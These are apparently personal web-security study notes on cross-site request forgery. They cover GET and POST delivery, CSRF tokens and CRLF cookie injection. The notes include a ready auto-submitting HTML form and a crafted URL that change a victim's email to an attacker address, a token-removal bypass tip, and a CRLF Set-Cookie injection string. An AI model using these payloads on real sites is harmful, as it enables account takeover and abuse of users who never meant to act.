# Cross-Site Request Forgery
#CSRF #CRLF #Cookies

Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to **induce** users to perform actions that they **do not intend** to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to **prevent** different websites from interfering with each other.
___
## Request Types
### GET Requests
GET requests are usually the easiest to deliver. **GET parameters** within the URL are changed by the attacker and then delivered to the victim. When the user clicks the link, the request is then **executed**. 

Example GET URI: `https://example.com/email/change?email=attacker@evil.com`

### POST Requests
For Cross-site request forgery attacks where the data **must be submitted** HTML forms can be used along side JavaScript which **automatically submites** the form. An example payload can be seen below:

```html
<html>
  <body>
    <form action="https://example.com/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker&#64;evil&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>document.forms[0].submit()</script>
  </body>
</html>
```
___
## CSRF Tokens
A CSRF token is a **unique**, **secret**, **unpredictable** value that is generated by the **server-side** application and transmitted to the client in such a way that it is included in a subsequent HTTP request made by the client. When the later request is made, the server-side application validates that the request includes the expected token and rejects the request if the token is missing or invalid.

CSRF tokens can prevent CSRF attacks by making it **impossible** for an attacker to construct a fully valid HTTP request suitable for feeding to a victim user. Since the attacker cannot determine or predict the value of a user's CSRF token, they **cannot** construct a request with all the parameters that are necessary for the application to honor the request.

*Note: Some applications may ignore the processing of a CSRF Token if it is not present within the request. Therefore, removing the CSRF from the request may result in a successful attack*
___
## CRLF Cookie Injection
[CRLF injection allow => cookie injection in root domain and xss](https://medium.com/@protostar0/crlf-injection-allow-cookie-injection-in-root-domain-xss-812cd807ba5b)

The **CRLF** (Carrige-return Line-feed) characters can be used to **inject** cookies into a page. An example of how this can be used within a search query can be seen below:
`/?search=test%0d%0aSet-Cookie:%20csrfKey=a26f2a3ef52ca`

This can be used within a CSRF attack where a **CSRF Key** might be associated with a **cookie**.